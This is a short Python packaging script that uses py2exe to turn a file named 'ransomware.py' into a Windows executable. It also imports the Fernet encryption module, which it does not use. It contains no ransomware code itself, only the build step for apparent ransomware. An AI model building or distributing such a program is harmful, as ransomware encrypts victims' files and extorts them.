from distutils.core import setup
import py2exe
from cryptography.fernet import Fernet
import os, glob, sys

sys.argv.append('py2exe')
setup(console=['ransomware.py'])
